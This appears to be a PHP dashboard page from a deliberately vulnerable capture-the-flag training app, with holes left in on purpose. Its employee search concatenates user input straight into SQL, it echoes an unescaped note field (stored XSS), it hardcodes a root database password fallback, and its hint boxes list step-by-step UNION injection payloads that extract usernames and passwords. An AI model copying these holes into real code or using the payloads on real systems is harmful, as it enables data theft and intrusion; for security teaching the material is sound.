<?php
session_start();

if (!isset($_SESSION['user'])) {
    header("Location: index.php");
    exit();
}

$conn = new mysqli(
    getenv('DB_HOST') ?: 'db',
    getenv('DB_USER') ?: 'root',
    getenv('DB_PASS') ?: 'mystery123',
    getenv('DB_NAME') ?: 'mystery_corp'
);

// Get difficulty from database
if (!$conn->connect_error) {
    $conn->query("CREATE TABLE IF NOT EXISTS ctf_settings (setting_key VARCHAR(50) PRIMARY KEY, setting_value TEXT)");
    $result = $conn->query("SELECT setting_value FROM ctf_settings WHERE setting_key = 'difficulty'");
    $difficulty = ($result && $result->num_rows > 0) ? $result->fetch_assoc()['setting_value'] : 'advanced';
} else {
    $difficulty = 'beginner';
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - Mystery Corporation</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-light">
    <div class="container-fluid mt-3">
        <nav class="navbar navbar-expand-lg navbar-dark bg-primary mb-4">
            <div class="container-fluid">
                <span class="navbar-brand"><i class="fas fa-tachometer-alt"></i> Mystery Corporation Dashboard</span>
                <div class="navbar-nav ms-auto">
                    <span class="navbar-text me-3">
                        <i class="fas fa-user"></i> Welcome, <?php echo htmlspecialchars($_SESSION['user']); ?> (<?php echo $_SESSION['role']; ?>)
                    </span>
                    <a href="submit.php" class="nav-link"><i class="fas fa-rocket"></i> Submit Flag</a>
                    <a href="leaderboard.php" class="nav-link"><i class="fas fa-trophy"></i> Leaderboard</a>
                    <a href="realtime-leaderboard.php" class="nav-link"><i class="fas fa-tv"></i> Live Board</a>
                    <a href="logout.php" class="nav-link"><i class="fas fa-sign-out-alt"></i> Logout</a>
                </div>
            </div>
        </nav>

        <div class="row">
            <div class="col-12">
                <div class="card shadow">
                    <div class="card-header bg-success text-white">
                        <h3 class="mb-0"><i class="fas fa-search"></i> Employee Investigation Portal</h3>
                    </div>
                    <div class="card-body">
                        
                        <?php if ($_SESSION['role'] == 'admin'): ?>
                        <!-- Admin access granted - investigate further for company secrets -->
                        <?php endif; ?>

                        <!-- Employee Search -->
                        <div class="card mt-4">
                            <div class="card-header bg-info text-white">
                                <h5 class="mb-0"><i class="fas fa-users"></i> Employee Search</h5>
                            </div>
                            <div class="card-body">
                                <form method="GET" class="mb-3">
                                    <div class="input-group">
                                        <input type="text" name="search" class="form-control" placeholder="Search employees..." 
                                               value="<?php echo isset($_GET['search']) ? htmlspecialchars($_GET['search']) : ''; ?>">
                                        <button type="submit" class="btn btn-primary">
                                            <i class="fas fa-search"></i> Search
                                        </button>
                                    </div>
                                </form>
                                
                                <?php if ($difficulty == 'beginner'): ?>
                                <div class="alert alert-info">
                                    <small><i class="fas fa-lightbulb"></i> SQL Injection Steps:</small><br>
                                    <small>1. Find columns: <code>%' ORDER BY 6#</code> then <code>%' ORDER BY 7#</code></small><br>
                                    <small>2. Test injection: <code>%' UNION SELECT 1,'test',NULL,NULL,NULL,NULL#</code></small><br>
                                    <small>3. Get DB info: <code>%' UNION SELECT 1,@@hostname,database(),@@version,NULL,NULL#</code></small><br>
                                    <small>4. List tables: <code>%' UNION SELECT 1,table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()#</code></small><br>
                                    <small>5. Get columns: <code>%' UNION SELECT 1,column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'#</code></small><br>
                                    <small>6. Extract data: <code>%' UNION SELECT 1,username,password,role,NULL,NULL FROM users#</code></small>
                                </div>
                                <?php elseif ($difficulty == 'intermediate'): ?>
                                <div class="alert alert-info">
                                    <small><i class="fas fa-lightbulb"></i> Try ORDER BY enumeration, then UNION SELECT techniques</small>
                                </div>
                                <?php endif; ?>
                                <small class="text-muted">Mode: <strong><?php echo ucfirst($difficulty); ?></strong></small>

                                <?php
                                if (isset($_GET['search'])) {
                                    $search = $_GET['search'];
                                    
                                    echo "<h6 class='mt-4'><i class='fas fa-list'></i> Search Results:</h6>";
                                    echo "<div class='table-responsive'>";
                                    echo "<table class='table table-striped'>";
                                    echo "<thead class='table-dark'><tr><th>Name</th><th>Department</th><th>Salary</th><th>Notes</th></tr></thead><tbody>";
                                    
                                    if (!empty(trim($search))) {
                                        // Another SQL injection vulnerability
                                        $query = "SELECT * FROM employees WHERE name LIKE '%$search%' OR department LIKE '%$search%'";
                                        
                                        // Debug: Log the query
                                        error_log("Search Query: " . $query);
                                        
                                        $result = $conn->query($query);
                                        
                                        if ($conn->error) {
                                            echo "<tr><td colspan='4'><div class='alert alert-danger'><i class='fas fa-exclamation-triangle'></i> SQL Error: " . htmlspecialchars($conn->error) . "</div></td></tr>";
                                        } elseif ($result && $result->num_rows > 0) {
                                            while ($row = $result->fetch_assoc()) {
                                                echo "<tr>";
                                                echo "<td>" . htmlspecialchars($row['name']) . "</td>";
                                                echo "<td>" . htmlspecialchars($row['department']) . "</td>";
                                                echo "<td>$" . (is_numeric($row['salary']) ? number_format($row['salary'], 2) : htmlspecialchars($row['salary'])) . "</td>";
                                                
                                                // XSS vulnerability - not escaping secret_note
                                                echo "<td>" . $row['secret_note'] . "</td>";
                                                echo "</tr>";
                                            }
                                        } else {
                                            echo "<tr><td colspan='4'><div class='alert alert-warning'><i class='fas fa-exclamation-triangle'></i> No employees found.</div></td></tr>";
                                        }
                                    } else {
                                        echo "<tr><td colspan='4'><div class='alert alert-info'><i class='fas fa-info-circle'></i> Please enter a search term to find employees.</div></td></tr>";
                                    }
                                    
                                    echo "</tbody></table></div>";
                                }
                                ?>
                            </div>
                        </div>

                        <!-- Hidden Admin Panel - Only accessible via direct URL discovery -->
                        <?php if ($_SESSION['role'] == 'admin'): ?>
                        <!-- Admin functions are available but hidden. Check employee notes for clues about admin panel locations -->
                        <?php endif; ?>

                        <?php if ($difficulty !== 'advanced'): ?>
                        <div class="card mt-4 border-primary">
                            <div class="card-header bg-primary text-white">
                                <h5 class="mb-0"><i class="fas fa-user-secret"></i> Investigation Tips</h5>
                            </div>
                            <div class="card-body">
                                <ul class="list-unstyled">
                                    <?php if ($difficulty == 'beginner'): ?>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Try SQL injection in the search field: <code>' UNION SELECT 1,2,3,4,5-- </code></li>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Extract user data: <code>' UNION SELECT 1,username,password,role,5 FROM users-- </code></li>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Look for XSS vulnerabilities in employee notes</li>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Use nmap to scan for other services: <code>nmap -p- localhost</code></li>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Try directory enumeration with gobuster</li>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Check for hidden services mentioned in employee notes</li>
                                    <?php else: ?>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Try SQL injection in the search field</li>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Look for XSS vulnerabilities in employee notes</li>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Use reconnaissance tools for discovery</li>
                                    <li><i class="fas fa-arrow-right text-primary"></i> Check for hidden services and directories</li>
                                    <?php endif; ?>
                                </ul>
                            </div>
                        </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>